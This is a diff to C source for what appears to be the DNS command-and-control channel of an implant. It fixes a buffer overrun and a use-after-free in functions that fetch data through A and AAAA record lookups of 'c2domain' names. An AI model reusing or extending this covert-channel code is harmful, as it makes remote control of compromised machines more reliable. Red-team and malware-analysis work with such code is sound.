@@ -110,8 +110,16 @@ unsigned int dns_get(char * domain, char * buffer, int max) {
 		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_geta, reqno, nonce, domain);
 		// dlog("channel_tcp.dns_get 2:  %s\n", c2domain);
 		data = channel_lookup_retry(c2domain, 100);
-		memcpy(buffer + read, (void *)&data, 4);
-		read += 4;
+		/* the A-record channel moves 4 bytes per query - a size that is not
+		 * a multiple of 4 must not let the final copy run past 'size' */
+		if (size - read < 4) {
+			memcpy(buffer + read, (void *)&data, size - read);
+			read = size;
+		}
+		else {
+			memcpy(buffer + read, (void *)&data, 4);
+			read += 4;
+		}
 		reqno++;
 	}
 
@@ -140,8 +148,15 @@ unsigned int dns_get6(char * domain, char * buffer, int max) {
 		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_getaaaa, reqno, nonce, domain);
 		// dlog("channel_tcp.dns_get6 2:  %s\n", c2domain);
 		channel_lookup_retry6(c2domain, 100, data);
-		memcpy(buffer + read, data, 16);
-		read += 16;
+		/* AAAA moves 16 bytes per query - same tail guard as dns_get */
+		if (size - read < 16) {
+			memcpy(buffer + read, data, size - read);
+			read = size;
+		}
+		else {
+			memcpy(buffer + read, data, 16);
+			read += 16;
+		}
 		reqno++;
 	}
 
@@ -297,9 +312,12 @@ unsigned int channel_lookup_retry(char * domain, int retry) {
 		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_A, &pDnsRecord);
 
 		if (!status) {
-			/* free the information */
+			/* grab the answer BEFORE freeing the record list - reading
+			 * through the freed pointer "worked" only while the heap had
+			 * not reused the node yet (compare channel_lookup below). */
+			unsigned int answer = pDnsRecord->Data.A.IpAddress;
 			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-			return pDnsRecord->Data.A.IpAddress;
+			return answer;
 		}
 
 		/* sleep for 5s if a failure happens... we'll try again at that time */
